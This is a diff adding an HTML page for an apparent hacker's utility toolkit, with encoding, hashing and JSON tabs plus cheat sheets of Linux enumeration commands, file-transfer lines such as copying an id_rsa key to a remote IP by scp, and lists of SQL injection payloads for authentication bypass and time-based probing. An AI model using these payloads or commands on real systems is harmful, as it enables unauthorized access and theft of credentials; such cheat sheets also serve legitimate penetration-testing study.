@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>h4ck3r</title>
+
+    <link rel="shortcut icon" href="./../assets/icon.png" type="image/x-icon">
+
+    <!-- importing css -->
+    <link rel="stylesheet" href="./../assets/css/bootstrap.css">
+    <link rel="stylesheet" href="./../assets/css/style.css">
+    <!-- importing js -->
+    <script src="./../assets/js/jquery.js"></script>
+    <script src="./../assets/js/popper.js"></script>
+    <script src="./../assets/js/bootstrap.js"></script>
+
+    <style>
+        body {
+            min-width: 800px !important;
+        }
+    </style>
+</head>
+
+<body class="bg-body">
+
+    <div class="container-fluid">
+
+        <nav class="nav nav-tabs">
+            <li class="nav-item">
+                <a data-id="base64" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark active_tab">
+                    Base64
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="urlencode" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    Url
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="hexer" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    HEX
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="hash" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    Hash
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="json" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    Json
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="cmdlib" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    cmd lib
+                </a>
+            </li>
+            <li class="nav-item">
+                <a data-id="sql" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
+                    SQL Injection
+                </a>
+            </li>
+            <li class="nav-item">
+                <a href="https://github.com/4nkitd/" target="_blank" class="nav-link  btn m-2 btn btn-sm btn-primary">
+                    Github
+                </a>
+            </li>
+        </nav>
+
+        <div class="container-fluid my-2">
+
+            <div id="base64" class="border border-success bg-tab-content rounded p-3">
+
+                <div class="row mx-md-4 mx-sm-1">
+
+                    <div class="col-md-12 p-2">
+                        <label for="url_dec" class="text-success">Base64</label>
+                        <textarea id="base64_data" rows="3" class="form-control border border-success"
+                            placeholder="Readable String"></textarea>
+
+                    </div>
+
+                    <div class="col-md-4 mt-2">
+                        <button class="btn col-md-5 btn-primary btn-sm mx-auto base64_encode">Encode</button>
+                        <button class="btn col-md-5 btn-danger btn-sm mx-auto base64_decode">Decode</button>
+                    </div>
+                    <div class="col-md-8  mt-2">
+                        <p class="text-success text-right">
+                            Your results will be auto copied to clipboard.
+                        </p>
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div style="display: none;" id="urlencode" class=" border border-success bg-tab-content rounded p-3 ">
+
+                <div class="row mx-md-4 mx-sm-1">
+
+                    <div class="col-md-12 p-2">
+                        <label for="url_data" class="text-success">Url</label>
+                        <textarea id="url_data" rows="3" class="form-control border border-success"
+                            placeholder="Readable String"></textarea>
+                    </div>
+
+                    <div class="col-md-4 mt-2">
+                        <button class="btn col-md-5 btn-primary btn-sm mx-auto url_encode">Encode</button>
+                        <button class="btn col-md-5 btn-danger btn-sm mx-auto url_decode">Decode</button>
+                    </div>
+                    <div class="col-md-8  mt-2">
+                        <p class="text-success text-right">
+                            Your results will be auto copied to clipboard.
+                        </p>
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <div style="display: none;" id="json" class=" border border-success bg-tab-content rounded p-3 ">
+
+                <div class="row mx-md-4 mx-sm-1">
+
+                    <div class="col-md-12 p-2">
+                        <label for="json_data" class="text-success">Json Beautifier</label>
+                        <textarea id="json_data" rows="3" class="form-control border border-success"
+                            placeholder="Readable String"></textarea>
+                        <pre id="json_data_p" style="display: none;" class="bg-light rounded  border border-success">
+                                </pre>
+                    </div>
+
+                    <div class="col-md-4">
+                        <button class="btn col-md-5 btn-primary btn-sm mx-auto json_beautifier">Beautify</button>
+                        <button class="btn col-md-5 btn-primary btn-sm mx-auto json__retry">Retry</button>
+                    </div>
+                    <div class="col-md-8 ">
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <div style="display: none;" id="hexer" class="border border-success bg-tab-content rounded p-3 ">
+
+                <div class="row mx-md-4 mx-sm-1">
+
+                    <div class="col-md-12 p-2">
+                        <label for="hex_data" class="text-success">HEX</label>
+                        <textarea id="hex_data" rows="3" class="form-control border border-success"
+                            placeholder="Readable String"></textarea>
+                    </div>
+
+                    <div class="col-md-4 mt-2">
+                        <button class="btn col-md-5 btn-primary btn-sm mx-auto hex_encode">Encode</button>
+                        <button class="btn col-md-5 btn-danger btn-sm mx-auto hex_decode">Decode</button>
+                    </div>
+                    <div class="col-md-8  mt-2">
+                        <p class="text-success text-right">
+                            Your results will be auto copied to clipboard.
+                        </p>
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div style="display: none;" id="hash" class="border border-success bg-tab-content rounded p-3 ">
+
+                <div class="row mx-md-4 mx-sm-1">
+
+                    <div class="col-md-4 p-2">
+                        <div class="form-group">
+                            <label for="hash_select_enc" class="text-success">Encryption/Hashing</label>
+                            <select class="form-control" aria-label="Select Encryption" id="hash_select_enc">
+                                <option value="" selected>Select Encryption</option>
+                                <option value="MD5">MD5</option>
+                                <option value="SHA256">Sha256</option>
+                                <option value="SHA512">SHA512</option>
+                                <option value="SHA3">SHA3</option>
+                                <option value="AES">AES</option>
+                            </select>
+                        </div>
+                        <div class="form-group my-auto">
+                            <button class="btn col-md-12 my-2 btn-primary btn mx-auto hash_encode">Encode
+                                Content</button>
+                            <button class="btn col-md-12 my-2 btn-danger btn mx-auto hash_decode">Decode
+                                Content</button>
+                        </div>
+                    </div>
+
+                    <div class="col-md-8 p-2">
+                        <div class="form-group">
+                            <label for="hash_salt" class="text-success">Encryption Salt ( --
+                                <span class="d-inline float-right text-success ">
+                                    Your results will be auto copied to clipboard.
+                                    <span /> -- )
+                            </label>
+
+                            <input type="text" class="form-control" id="hash_salt" placeholder="Only for AES">
+                        </div>
+                        <div class="form-group">
+                            <label for="hash_data" class="text-success"> Data </label>
+                            <textarea id="hash_data" rows="2" class="form-control border border-success"
+                                placeholder="Readable Text"></textarea>
+
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div style="display: none;" id="cmdlib"
+                class="border border-success bg-tab-content bg-dark shadow rounded p-3 ">
+
+                <div class="row mx-auto my-auto bg-dark text-success">
+
+                    <ul class="mx-auto">
+                        <li><strong>System Version</strong></li>
+                        <li><code>cat /etc/issue</code></li>
+                        <li><code>cat /etc/*-release</code></li>
+                        <li><code>cat /etc/lsb-release</code></li>
+                        <li><code>cat /etc/redhat-release</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>User Env</strong></li>
+                        <li><code>cat /etc/profile</code></li>
+                        <li><code>cat /etc/bashrc</code></li>
+                        <li><code>set</code></li>
+                        <li><code>env</code></li>
+                        <li><code>cat ~/.bash_logout</code></li>
+                        <li><code>cat ~/.bashrc</code></li>
+                        <li><code>cat ~/.bash_profile</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>Networking</strong></li>
+                        <li><code>lsof -i</code></li>
+                        <li><code>lsof -i :80</code></li>
+                        <li><code>grep 80 /etc/services</code></li>
+                        <li><code>netstat -antup</code></li>
+                        <li><code>netstat -antpx</code></li>
+                        <li><code>netstat -tulpn</code></li>
+                        <li><code>chkconfig --list</code></li>
+                        <li><code>last</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>SCP</strong></li>
+                        <li><code>scp id_rsa username@10.10.164.167:~/destination -P 1337</code></li>
+                        <li><code>scp user@10.10.164.167:~/path_to_file file_saved -P 1337</code></li>
+
+                        <li><strong>python</strong></li>
+                        <li><code>python3 -m http.server 1337</code></li>
+                        <li><code>python -m SimpleHTTPServer 1337</code></li>
+
+                        <li><strong>download</strong></li>
+                        <li><code>wget http://url </code></li>
+                        <li><code>curl -o local_save_path http://url</code></li>
+                    </ul>
+                </div>
+
+
+
+            </div>
+
+            <div style="display: none;" id="sql"
+                class="border border-success bg-tab-content bg-dark shadow rounded p-3 ">
+
+                <div class="row mx-auto my-auto bg-dark text-success">
+
+                    <ul class="mx-auto">
+                        <li><strong>Generic Payload</strong></li>
+                        <li><code>' or '</code></li>
+                        <li><code>-- or # </code></li>
+                        <li><code>' OR '1</code></li>
+                        <li><code>' OR 1 -- -</code></li>
+                        <li><code>OR "" = "</code></li>
+                        <li><code>" OR 1 = 1 -- -"</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>Generic Payload</strong></li>
+                        <li><code>' OR '' = '</code></li>
+                        <li><code>'='</code></li>
+                        <li><code>'LIKE'</code></li>
+                        <li><code>'=0--+</code></li>
+                        <li><code>OR 1=1</code></li>
+                        <li><code>' OR 'x'='x</code></li>
+                        <li><code>' AND id IS NULL; --</code></li>
+                        <li><code>'''''''''''''UNION SELECT '2</code></li>
+
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>Time Based</strong></li>
+                        <li><code>,(select * from (select(sleep(10)))a)</code></li>
+                        <li><code>';WAITFOR DELAY '0:0:30'--</code></li>
+                        <li><code>%2c(select%20*%20from%20(select(sleep(10)))a)</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>Auth</strong></li>
+                        <li><code>' or ''-'</code></li>
+                        <li><code>' or '' '</code></li>
+                        <li><code>' or ''&'</code></li>
+                        <li><code>' or ''^'</code></li>
+                        <li><code>' or ''*'</code></li>
+                        <li><code>or true--</code></li>
+                    </ul>
+
+                    <ul class="mx-auto">
+                        <li><strong>Auth</strong></li>
+                        <li><code>" or true--</code></li>
+                        <li><code>' or true--</code></li>
+                        <li><code>") or true--</code></li>
+                        <li><code>') or true--</code></li>
+                        <li><code>admin') or ('1'='1'--</code></li>
+                        <li><code>admin') or ('1'='1'#</code></li>
+                        <li><code>admin') or ('1'='1'/</code></li>
+                    </ul>
+                </div>
+
+
+
+            </div>
+
+        </div>
+
+
+    </div>
+
+
+    <script src="./../assets/js/crypto.js"></script>
+    <script src="./../assets/js/utf8.js"></script>
+    <script src="./../assets/js/functions.js"></script>
+    <script src="./../assets/js/app.js"></script>
+
+</body>
+
+</html>
